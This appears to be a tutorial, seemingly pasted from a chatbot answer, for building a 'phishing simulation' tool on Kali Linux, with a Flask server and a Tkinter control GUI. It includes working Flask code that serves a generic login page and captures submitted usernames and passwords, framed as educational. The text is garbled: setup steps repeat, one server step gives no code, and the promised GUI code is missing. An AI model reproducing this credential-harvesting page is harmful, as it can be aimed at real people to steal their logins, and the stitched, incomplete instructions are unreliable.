To build a social engineering tool for educational or ethical purposes, follow these step-by-step instructions. We’ll create a simple phishing simulation tool that includes:

A Flask server to host a mock phishing page.
A Tkinter GUI to start and stop the Flask server.
Prerequisites
Kali Linux with Python installed.
Python 3 and virtual environment.
1. Set Up Your Environment
Install Python and Virtual Environment:

Open a terminal and ensure you have Python and the virtual environment package:


sudo apt update
sudo apt install python3 python3-pip python3-venv
Create a Project Directory:


mkdir ~/social_engineering_tool
cd ~/social_engineering_tool
Create and Activate a Virtual Environment:


python3 -m venv venv
source venv/bin/activate
2. Set Up the Flask Server
Install Required Packages:

With the virtual environment activated, install Flask:


pip install flask
Create the Flask Server Script:

2.  Create the Flask Server Script:

In the ~/social_engineering_tool directory,
create a file named server.py:
then edit your code in this file and save it 


Run the Flask Server:


python server.py
You should see output indicating the server is running, and you can access it at http://localhost:5000 in a web browser.

Kali Linux with Python installed.

1. Set Up Your Environment
Install Python and Virtual Environment:

Open a terminal and ensure you have Python and the virtual environment package:

bash
Copy code
sudo apt update
sudo apt install python3 python3-pip python3-venv
Create a Project Directory:

bash
Copy code

2. Set Up the Flask Server
Install Required Packages:

With the virtual environment activated, install Flask:

bash
Copy code
pip install flask
Create the Flask Server Script:

In the ~/social_engineering_tool directory, create a file named server.py:

python
Copy code
# server.py
from flask import Flask, request, render_template_string, redirect, url_for

app = Flask(__name__)

# HTML template for phishing page
phishing_page = '''
<!doctype html>
<html>
<head><title>Login Page</title></head>
<body>
    <h2>Login to Your Account</h2>
    <form action="/submit" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(phishing_page)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    # Print captured credentials to the console
    print(f"Captured credentials: Username: {username}, Password: {password}")
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(port=5000, debug=True)
Run the Flask Server:

bash
Copy code
python server.py
You should see output indicating the server is running, and you can access it at http://localhost:5000 in a web browser.

3. Create the Tkinter GUI
Install Tkinter (if not already installed):

Tkinter usually comes pre-installed with Python, but if not:


sudo apt install python3-tk
Create the Tkinter GUI Script:
then enter your GUI code 

Run the Tkinter GUI:
python gui.py 
This will open a GUI window with buttons to start and stop the Flask server.



4. Testing the Tool
Start the Server:

Open the Tkinter GUI (gui.py).
Click the "Start Phishing Server" button. This will start the Flask server and you should see a confirmation message.
Access the Phishing Page:

Open a web browser and navigate to http://localhost:5000.
You should see the mock login page.
Submit Test Data:

Enter a username and password on the mock phishing page and submit.
Check the terminal where you ran server.py to see the captured credentials.
Stop the Server:

In the Tkinter GUI, click the "Stop Phishing Server" button to stop the Flask server.
Summary
Create the Flask server to serve a mock phishing page.
Set up the Tkinter GUI to start and stop the Flask server.
Test the tool by accessing the mock phishing page and submitting data.
